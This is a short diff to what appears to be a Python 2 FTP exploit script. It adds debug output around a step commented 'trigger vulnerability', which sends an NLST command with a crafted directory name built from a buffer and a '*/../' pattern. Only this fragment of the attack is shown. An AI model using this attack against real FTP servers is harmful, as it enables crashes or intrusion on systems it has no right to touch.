@@ -237,7 +237,9 @@ def main():
     print data
     
     #trigger vulnerability
+    print "[+] Sending NLIST command to trigger vulnerability..."
     dir_name = " %s*/../%s*/" % (d_buffer, pre)
-    ftp_server.nlst(dir_name)
+    data = ftp_server.nlst(dir_name)
+    print data
         
 main()
